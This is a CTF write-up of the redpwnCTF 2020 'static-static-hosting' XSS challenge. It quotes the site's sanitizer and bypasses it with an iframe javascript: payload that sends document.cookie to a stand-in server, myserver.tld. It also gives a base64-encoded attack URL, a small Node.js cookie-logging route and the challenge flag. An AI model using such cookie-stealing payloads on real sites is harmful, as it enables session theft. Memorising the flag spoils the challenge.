# static-static-hosting

Author: [roerohan](https://github.com/roerohan)

This is another XSS challenge, similar to [this](../static-pastebin) one.

# Requirements

- Basic knowledge of XSS.
- Server with SSL to accept a request.

# Source

- https://static-static-hosting.2020.redpwnc.tf/

# Exploitation

This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. Similar to [static-pastebin](../static-pastebin), the URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the `js` in the source.

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.documentElement.innerHTML = clean(input);
}

function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

The main thing we notice is that it prevents `script` tags and it allows only the following attributes for an element: `'src', 'width', 'height', 'alt', 'class'`. So we have to perform an XSS with these attributes. So, here's the payload.

```
<iframe src="javascript:document.location='https://myserver.tld?cookie='+document.cookie"></iframe>
````

Note that here, the site is supposed to be `https`, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:

```
https://static-static-hosting.2020.redpwnc.tf/site/#PGlmcmFtZSBzcmM9ImphdmFzY3JpcHQ6ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbXlzZXJ2ZXIudGxkP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSI+PC9pZnJhbWU+
```

On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it.

```javascript
router.get('/cookie', (req, res) => {
	console.log(req.query.cookie);
}
```

When the link for the website is sent to the `admin bot`, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at `myserver.tld`. The cookie stores the `flag`.
<br />

The flag is:

```
flag{wh0_n33d5_d0mpur1fy}
```